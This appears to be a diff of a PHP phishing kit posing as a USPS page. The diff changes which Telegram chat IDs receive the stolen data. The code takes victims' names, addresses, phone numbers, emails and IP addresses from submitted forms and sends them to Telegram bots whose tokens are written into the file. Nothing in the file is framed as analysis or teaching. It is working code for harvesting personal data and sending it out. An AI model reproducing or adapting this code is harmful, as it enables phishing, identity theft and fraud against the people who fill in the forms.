@@ -4,7 +4,7 @@ if(isset($_SESSION["username"])) {
 
 if(isset($_GET['messageId'])){
 $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
-$chatID = "-4141629905";
+$chatID = "-4196036211";
 	$messageId=$_GET['messageId'];
 	$ipzebi=$_GET['ipzebi'];
 	$message ="IP: $ipzebi , status : bill";
@@ -75,7 +75,7 @@ $ip = getenv("REMOTE_ADDR");
 $message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nstate  : ".$_POST['sstate']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nEmail  : ".$_POST['email']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
 
 
-sendMessageT('1064643518',$message,'6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk');
+sendMessageT('-4141629905',$message,'6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk');
     $_SESSION["msg"] = $message ;
 
 HEADER("Location: index2.php");
